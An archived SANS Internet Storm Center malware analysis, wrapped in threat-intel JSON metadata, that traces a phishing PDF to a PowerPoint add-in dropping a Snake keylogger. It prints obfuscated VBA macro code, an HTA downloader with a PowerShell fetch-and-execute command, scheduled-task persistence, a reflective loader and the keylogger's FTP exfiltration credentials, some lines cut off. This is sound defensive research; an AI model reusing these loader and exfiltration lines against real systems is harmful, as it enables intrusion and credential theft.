{
    "id": "c691467c-07ad-4443-9379-b72b879fa059",
    "created_at": "2023-01-12T15:08:08.43004Z",
    "updated_at": "2025-03-27T02:05:20.067765Z",
    "deleted_at": null,
    "sha1_hash": "d2f8fc0aa4e8c8a3667b3fc46a4c46a629291dd4",
    "title": "2022-04-25 - Simple PDF Linking to Malicious Content",
    "authors": "",
    "file_creation_date": "2022-05-28T15:58:19Z",
    "file_modification_date": "2022-05-28T15:58:19Z",
    "file_size": 162308,
    "plain_text": "# SANS ISC: Simple PDF Linking to Malicious Content - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training SANS ISC InfoSec Forums\n\n**isc.sans.edu/forums/diary/Simple+PDF+Linking+to+Malicious+Content/28582/**\n\n## ← Next Thread Previous Thread →\n\n Simple PDF Linking to Malicious Content\n\n Last week, I found an interesting piece of phishing based on a PDF file. Today, most of the PDF files that are delivered to end-user are not malicio common because they are (usually) not blocked by common filters at the perimeter.\n\n The PDF file (SHA256:f39408fee496216cf5f30764e6f259f71ea0ab4daa81f808f2958e8fca772d01) has a VT score of 1/58 and display a nice mes\n\n The PDF is obfuscated in a classic way, all objects are embedded in an Object Stream:\n```\n remnux@remnux:/MalwareZoo/20220425$ pdfid.py f39408fee496216cf5f30764e6f259f71ea0ab4daa81f808f2958e8fca772d01.pdf -n\n PDFiD 0.2.8 foo.pdf\n PDF Header: %PDF-1.5\n obj          25\n endobj        25\n stream        23\n endstream       23\n startxref       1\n /ObjStm        1\n /AcroForm       1\n\n The file has a /URI keyword that points to the malicious URL:\n remnux@remnux://MalwareZoo/20220425$ pdf-parser.py -O f39408fee496216cf5f30764e6f259f71ea0ab4daa81f808f2958e8fca772d01.pdf -k /URI\n  /URI (hxxps://www[.]mediafire[.]com/file/fwxhm1vylsg3nl3/7.ppam/file)\n\n To visit the malicious URL, the victim has to click on the picture displayed above, this is made in the PDF file via the /Annot object:\n\n```\n\n-----\n\n```\nobj 22 0\n Containing /ObjStm: 1 0\n Type: /Annot\n Referencing: 27 0 R, 28 0 R\n <<\n  /Type /Annot\n  /Subtype /Link\n  /A 27 0 R\n  /Rect [1 0 613 791]\n  /BS 28 0 R\n >>\nremnux@remnux://MalwareZoo/20220425$ pdf-parser.py -O f39408fee496216cf5f30764e6f259f71ea0ab4daa81f808f2958e8fca772d01.pdf -o 27\nobj 27 0\n Containing /ObjStm: 1 0\n Type: /Action\n Referencing: \n <<\n  /Type /Action\n  /S /URI\n  /URI (hxxps://www[.]mediafire[.]com/file/fwxhm1vylsg3nl3/7.ppam/file)\n >>\n\n## When you visit the URL, you fill fetch a malicious PowerPoint file: 7.ppam (SHA256:2198abfdf736586893afe8e15153369299d3164e036920ff19c8\nremnux@remnux:/MalwareZoo/20220425$ zipdump.py 7.ppam\nIndex Filename                   Encrypted Timestamp      \n  1 [Content_Types].xml                  0 2022-04-06 13:56:56 \n  2 _rels/.rels                      0 1980-01-01 00:00:00 \n  3 ppt/_rels/presentation.xml.rels            0 2022-04-06 13:57:10 \n  4 ppt/presentation.xml                 0 1980-01-01 00:00:00 \n  5 ppt/slideLayouts/_rels/slideLayout5.xml.rels     0 1980-01-01 00:00:00 \n  6 ppt/slideLayouts/_rels/slideLayout8.xml.rels     0 1980-01-01 00:00:00 \n  7 ppt/slideLayouts/_rels/slideLayout9.xml.rels     0 1980-01-01 00:00:00 \n  8 ppt/slideLayouts/_rels/slideLayout10.xml.rels     0 1980-01-01 00:00:00 \n  9 ppt/slideLayouts/_rels/slideLayout11.xml.rels     0 1980-01-01 00:00:00 \n  10 ppt/slideLayouts/_rels/slideLayout7.xml.rels     0 1980-01-01 00:00:00 \n  11 ppt/slideLayouts/_rels/slideLayout6.xml.rels     0 1980-01-01 00:00:00 \n  12 ppt/slideMasters/_rels/slideMaster1.xml.rels     0 1980-01-01 00:00:00 \n  13 ppt/slideLayouts/_rels/slideLayout1.xml.rels     0 1980-01-01 00:00:00 \n  14 ppt/slideLayouts/_rels/slideLayout2.xml.rels     0 1980-01-01 00:00:00 \n  15 ppt/slideLayouts/_rels/slideLayout3.xml.rels     0 1980-01-01 00:00:00 \n  16 ppt/slideLayouts/slideLayout11.xml          0 1980-01-01 00:00:00 \n  17 ppt/slideLayouts/slideLayout10.xml          0 1980-01-01 00:00:00 \n  18 ppt/slideLayouts/slideLayout9.xml           0 1980-01-01 00:00:00 \n  19 ppt/slideMasters/slideMaster1.xml           0 1980-01-01 00:00:00 \n  20 ppt/slideLayouts/slideLayout1.xml           0 1980-01-01 00:00:00 \n  21 ppt/slideLayouts/slideLayout2.xml           0 1980-01-01 00:00:00 \n  22 ppt/slideLayouts/slideLayout3.xml           0 1980-01-01 00:00:00 \n  23 ppt/slideLayouts/slideLayout4.xml           0 1980-01-01 00:00:00 \n  24 ppt/slideLayouts/slideLayout5.xml           0 1980-01-01 00:00:00 \n  25 ppt/slideLayouts/slideLayout6.xml           0 1980-01-01 00:00:00 \n  26 ppt/slideLayouts/slideLayout7.xml           0 1980-01-01 00:00:00 \n  27 ppt/slideLayouts/slideLayout8.xml           0 1980-01-01 00:00:00 \n  28 ppt/slideLayouts/_rels/slideLayout4.xml.rels     0 1980-01-01 00:00:00 \n  29 ppt/theme/theme1.xml                 0 1980-01-01 00:00:00 \n  30 ppt/ksjksj.~text~TEXT~TEXT~              0 1980-01-01 00:00:00 \n  31 docProps/thumbnail.jpeg                0 2022-02-07 22:50:16 \n  32 ppt/presProps.xml                   0 1980-01-01 00:00:00 \n  33 ppt/tableStyles.xml                  0 1980-01-01 00:00:00 \n  34 ppt/viewProps.xml                   0 1980-01-01 00:00:00 \n  35 docProps/app.xml                   0 1980-01-01 00:00:00 \n  36 docProps/core.xml                   0 1980-01-01 00:00:00 \n\n The stream ID 30 looks the most interesting. It contains indeed a macro:\n\n```\n\n-----\n\n```\n 1:    516 'PROJECT'\n 2:    26 'PROJECTwm'\n 3: M  5457 'VBA/Module1'\n 4:   2463 'VBA/_VBA_PROJECT'\n 5:    529 'VBA/dir'\nremnux@remnux:/MalwareZoo/20220425$ zipdump.py 7.ppam -s 30 -d | oledump.py -s 3 -v\nAttribute VB_Name = \"Module1\"\nSub Auto_Open()\n:::::: MsgBox \"error! Re-install office\":::::: Dim koaksdokasd As String:::::: koakosdk = \"!@##!!@%^@^^n&&$%#g&&$%#tcar:\":::::: koakos\naskjdjawjkdokawod = Replace(askjdjawjkdokawod, \"askjdjawjkdokawod\", \"W\"):::::: askjdjawjkdokawod = Replace(askjdjawjkdokawod, \"5\", \"i\"\n:::::: koaksdokasd = \"C:\\Users\\Public\\update.js\":::::: Close::::::   Open koaksdokasd For Output As #1:::::: Print #1, \"function _0x\n['SpawnInstance_','30XpBDce','C:\\x5cProgramData\\x5cddond.com','2WjTghW','Win32_ProcessStartup','3551556ACfgms','CopyFile','1902954vylc\nS'];\"\n:::::: Print #1, \"_0x98da=function(){return _0x4db6f6;};return _0x98da();}var _0x550d40=_0x2a39;(function(_0x3935a0,_0x1de856){var _0x\nparseInt(_0x57a7a7(0x1ac))/0x5)+parseInt(_0x57a7a7(0x1a8))/0x6*(parseInt(_0x57a7a7(0x1aa))/0x7)+parseInt(_0x57a7a7(0x19c))/0x8*(parseI\n:::::: Print #1, \"if(_0x2a1df1===_0x1de856)break;else _0xff11fe['push'](_0xff11fe['shift']());}catch(_0x589b6a){_0xff11fe['push'](_0xf\nw32ps=GetObject(_0x550d40(0x1ad))[_0x550d40(0x1a9)](_0x550d40(0x1a5));w32ps[_0x550d40(0x1a1)](),w32ps[_0x550d40(0x1ab)]=0x0;var rtrnCo\n. _\nGet(askjdjawjkdokawod) _\n. _\nCreate (\"wscript C:\\Users\\Public\\update.js\")\nEnd Sub\n\n## No need to deobfuscate the macro completely, we see interesting strings (in red). The next payload is downloaded and then executed through ms\n<!DOCTYPE html>\n<html>\n<head>\n<HTA:APPLICATION ID=\"CS\"\nAPPLICATIONNAME=\"Downloader\"\nWINDOWSTATE=\"minimize\"\nMAXIMIZEBUTTON=\"no\"\nMINIMIZEBUTTON=\"no\"\nCAPTION=\"no\"\nSHOWINTASKBAR=\"no\">\n<script>\nchuchukukukaokiwDasidow = new ActiveXObject('Wscript.Shell');\nkiii = \"C:\\\\ProgramData\\\\ESETNONU.com\";\nvar king = new ActiveXObject(\"Scripting.FileSystemObject\");var pit = king.CopyFile (\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\P\niii);\ncmd = \"C:\\\\ProgramData\\\\ESETNONU.com -EP B -NoP -c i'e'x([System.IO.StreamReader]::new( [System.Net.WebRequest]::Create('hxxps://www[.\n/w2uuz1cy4cl2gup/7.dll/file').GetResponse().GetResponseStream()).ReadToend());\";\nvar w32ps= GetObject('winmgmts:').Get('Win32_ProcessStartup');w32ps.SpawnInstance_();w32ps.ShowWindow=0;var rtrnCode=GetObject('winmgm\nProcess').Create(cmd,null,w32ps,null);\nchuchukukukaokiwDasidow.Run('schtasks /create /sc MINUTE /mo 82 /tn calendersw /F /tr \"\"\"%programdata%\\\\milon.com' + '\"\"\"\"\"\"' + 'hxxps\ncom/file/3k4f9iglvljn9kt/7.htm/file\"\"\"',0);\nmegamon = \"C:\\\\ProgramData\\\\milon.com\";\nvar dihearter = new ActiveXObject(\"Scripting.FileSystemObject\");var pit = dihearter.CopyFile (\"C:\\\\Windows\\\\System32\\\\mshta.exe\", mega\nchuchukukukaokiwDasidow.Run(\"taskkill /f /im WinWord.exe\",0);\nchuchukukukaokiwDasidow.Run(\"taskkill /f /im Excel.exe\",0);\nchuchukukukaokiwDasidow.Run(\"taskkill /f /im POWERPNT.exe\",0);\nwindow.close();\n</script>\n</head>\n<body>\n</body>\n</html>\n\n You can see that the script implements persistence through a scheduled task and tries also to kill some processes. It fetches the next stage again\nremnux@remnux:/MalwareZoo/20220425$ base64dump.py 7.dll\nID Size  Encoded     Decoded     md5 decoded           \n-- ----  -------     -------     -----------           \n 1:    4 Text       M.m       3d0b353fa22a0001c9a7fda13f7c638e\n 2:    8 Encoding     .w(v).      02b746b5b6358014a5294544d71a4dd7\n 3:   16 FromBase64String ..&.......).   4cfff9a87d891e1961d358c98991e469\n 4:  3560 QWRkLVR5cGUgLXR5 Add-Type -typede 0a9525d9ff1e87418c0b5c496546f889\n 5:    4 byte       o+^       50d0380b0362cc343a78fa4231fffe0f\n 6:    4 nona       ...       8a773bb6add7d540b7c92c1ec8b22870\n 7:    4 Text       M.m       3d0b353fa22a0001c9a7fda13f7c638e\n 8:    8 Encoding     .w(v).      02b746b5b6358014a5294544d71a4dd7\n 9:   16 FromBase64String ..&.......).   4cfff9a87d891e1961d358c98991e469\n10:  53872 W2J5dGVbXV0gJFNU [byte[]] $STRDYF adddffbf83acb22aaeccc45b897e99c3\n\n The most interesting stream IDs look to be 4 and 10. Stream ID 4 contains the code to deobfuscate the second one. Let's check ID 10:\n\n```\n\n-----\n\n```\n ... Stuff deleted ...\n,169,182,152,105,157,58,250,129,8,15,178,241,99,153,24,104,242,117,245,190,185,254,7,175,109,194,239,216,213,150,255,179,21,249,230,25\n [byte[]] $RSETDYUGUIDRSTRDYUGIHOYRTSETRTYDUGIOH = Get-DecompressedByteArray $nona\n [byte[]] $RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG =Get-DecompressedByteArray $STRDYFUGIHUYTYRTESRDYUGIRI\n $FGCHJBKHVGCFHJVBKNBHVGJB = D4FD5C5B9266824C4EEFRWEOIURWDQWOIDUQW389C83E0C69FD3FAAG -TypeName 'System.Collections.ArrayList';\n $FGCHJBKHVGCFHJVBKNBHVGJB.Add(\"W1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKCRSRFNGR1RGSFlHVUpIS0dZRlREUlNSRFRGWUdKVUhLRERSVEZZRykuR2V0VHlwZSg\n $FGCHJBKHVGCFHJVBKNBHVGJBA = COMBINEMEANINGSCOBOLTPOTASSIUM($FGCHJBKHVGCFHJVBKNBHVGJB)\n $RDTTFYGJHKUYGTFRYTFYGUHIJGYYGU = D4FD5C5B9266824C4EEFC83E0C69FD3FAA($FGCHJBKHVGCFHJVBKNBHVGJBA);try{$n=0;while($n -lt 3){&(GCM I*e-E*\n [Reflection.Assembly]::Load($RDSFGTFHYGUJHKGYFTDRSRDTFYGJUHKDDRTFYG).GetType('projFUD.PA').GetMethod('Execute').Invoke($null,[object[]\n\n## The scripts dumps and executes a PE file (SHA256:039c261036b80fd500607279933c43c4f1c78fdba1b54a9edbc8217df49ec154) that is not pres\n\n The first analysis reports it as a Snake keylogger:\n {\n  \"family\": \"snakekeylogger\", \n  \"rule\": \"SnakeKeylogger\", \n  \"credentials\": [ \n   { \n    \"protocol\": \"ftp\", \n    \"host\": \"ftp://103[.]147[.]185[.]85/\", \n    \"port\": 21, \n    \"username\": \"bvhfgas7\", \n    \"password\": \"xxxxxxxx\" \n   } \n  ] \n }\n\n The malware seems active based on the collected data that I found:\n remnux@remnux:/MalwareZoo/20220425$ ftp 103[.]147[.]185[.]85\n Connected to 103[.]147[.]185[.]85.\n 220-FileZilla Server version 0.9.41 beta\n 220-written by Tim Kosse (Tim.Kosse@gmx.de)\n 220 Please visit http://sourceforge.net/projects/filezilla/\n Name (103[.]147[.]185[.]85:root): bvhfgas7\n 331 Password required for bvhfgas7\n Password:\n 230 Logged on\n Remote system type is UNIX.\n Using binary mode to transfer files.\n ftp> ls -l\n 229 Entering Extended Passive Mode (|||65003|)\n 150 Connection accepted\n -rw-r--r-- 1 ftp ftp      316 Apr 05 02:06 AMAZING-AVOCADO - Passwords ID - ZyiAEnXWZP1101827263.txt\n -rw-r--r-- 1 ftp ftp      316 Apr 05 02:06 AMAZING-AVOCADO - Passwords ID - ZyiAEnXWZP1872355191.txt\n -rw-r--r-- 1 ftp ftp      293 Apr 24 22:06 AUVQQRRF - Passwords ID - ZyiAEnXWZP532723221.txt\n -rw-r--r-- 1 ftp ftp      292 Apr 05 19:53 CPJISPWT - Passwords ID - ZyiAEnXWZP1110184397.txt\n -rw-r--r-- 1 ftp ftp      292 Apr 05 19:55 CPJISPWT - Passwords ID - ZyiAEnXWZP1883154258.txt\n -rw-r--r-- 1 ftp ftp      292 Apr 05 19:52 CPJISPWT - Passwords ID - ZyiAEnXWZP2014006797.txt\n -rw-r--r-- 1 ftp ftp      292 Apr 05 19:53 CPJISPWT - Passwords ID - ZyiAEnXWZP2067984079.txt\n -rw-r--r-- 1 ftp ftp      292 Apr 05 19:53 CPJISPWT - Passwords ID - ZyiAEnXWZP384268998.txt\n -rw-r--r-- 1 ftp ftp      292 Apr 05 19:55 CPJISPWT - Passwords ID - ZyiAEnXWZP506198539.txt\n -rw-r--r-- 1 ftp ftp      292 Apr 05 19:55 CPJISPWT - Passwords ID - ZyiAEnXWZP573982685.txt\n -rw-r--r-- 1 ftp ftp      292 Apr 05 19:52 CPJISPWT - Passwords ID - ZyiAEnXWZP637051078.txt\n -rw-r--r-- 1 ftp ftp      292 Apr 05 19:53 CPJISPWT - Passwords ID - ZyiAEnXWZP878300114.txt\n -rw-r--r-- 1 ftp ftp      301 Apr 06 04:56 DESKTOP-D019GDM - Passwords ID - ZyiAEnXWZP1360583859.txt\n -rw-r--r-- 1 ftp ftp      301 Apr 06 04:56 DESKTOP-D019GDM - Passwords ID - ZyiAEnXWZP1592468142.txt\n -rw-r--r-- 1 ftp ftp      301 Apr 06 04:56 DESKTOP-D019GDM - Passwords ID - ZyiAEnXWZP1711955750.txt\n -rw-r--r-- 1 ftp ftp      301 Apr 06 04:56 DESKTOP-D019GDM - Passwords ID - ZyiAEnXWZP1868796841.txt\n -rw-r--r-- 1 ftp ftp      300 Apr 04 23:18 DESKTOP-D019GDM - Passwords ID - ZyiAEnXWZP609212224.txt\n -rw-r--r-- 1 ftp ftp      293 Apr 24 22:06 JVJHUWZP - Passwords ID - ZyiAEnXWZP1117034868.txt\n -rw-r--r-- 1 ftp ftp       38 Mar 29 20:43 Snake Keylogger - YrTVKTaWocPKgCyA - 222139415.txt\n -rw-r--r-- 1 ftp ftp      293 Apr 24 22:11 WIN7X64 - Passwords ID - ZyiAEnXWZP1161416015.txt\n 226 Transfer OK\n\n [1] https://isc.sans.edu/forums/diary/Analyzing+a+Phishing+Word+Document/28562/\n [2] https://www.virustotal.com/gui/file/f39408fee496216cf5f30764e6f259f71ea0ab4daa81f808f2958e8fca772d01\n [3] https://www.virustotal.com/gui/file/2198abfdf736586893afe8e15153369299d3164e036920ff19c83043ba4ce54b\n [4] https://bazaar.abuse.ch/sample/039c261036b80fd500607279933c43c4f1c78fdba1b54a9edbc8217df49ec154/\n\n Xavier Mertens (@xme) Xameco Senior ISC Handler - Freelance Cyber Security Consultant PGP Key\n\n I will be teaching next: Reverse-Engineering Malware: Malware Analysis Tools and Techniques - SANS London June 2022\n\n ← Next Thread Previous Thread →\n\n Sign Up for Free or Log In to start participating in the conversation!\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-25 - Simple PDF Linking to Malicious Content.pdf"
    ],
    "report_names": [
        "2022-04-25 - Simple PDF Linking to Malicious Content.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536088,
    "ts_updated_at": 1743041120,
    "ts_creation_date": 1653753499,
    "ts_modification_date": 1653753499,
    "files": {
        "pdf": "https://archive.orkl.eu/d2f8fc0aa4e8c8a3667b3fc46a4c46a629291dd4.pdf",
        "text": "https://archive.orkl.eu/d2f8fc0aa4e8c8a3667b3fc46a4c46a629291dd4.txt",
        "img": "https://archive.orkl.eu/d2f8fc0aa4e8c8a3667b3fc46a4c46a629291dd4.jpg"
    }
}